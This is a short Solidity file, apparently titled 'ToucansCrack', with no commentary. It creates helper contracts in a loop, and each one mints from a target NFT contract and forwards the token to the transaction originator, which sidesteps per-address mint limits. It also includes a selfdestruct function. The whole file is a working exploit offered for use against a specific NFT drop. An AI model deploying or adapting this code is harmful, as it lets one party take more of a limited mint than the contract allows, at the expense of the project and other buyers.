// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IERC721mintable {
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function mint() external;
}

contract Contract is IERC721Receiver {
    address nftaddress;

    constructor(address toucans) {
        nftaddress = toucans;
    }

    function mint() public returns (bool success) {
        IERC721mintable(nftaddress).mint();
        return true;
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) public virtual override returns (bytes4) {
        IERC721mintable(nftaddress).transferFrom(
            address(this),
            tx.origin,
            _tokenId
        );
        return this.onERC721Received.selector;
    }
}

contract ToucansCrack {
    constructor() {}

    function createContract(address toucans) external {
        uint256 idx = 0;
        while (idx < 2) {
            Contract newContract = new Contract(toucans);
            newContract.mint();
            idx = idx + 1;
        }
    }

    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
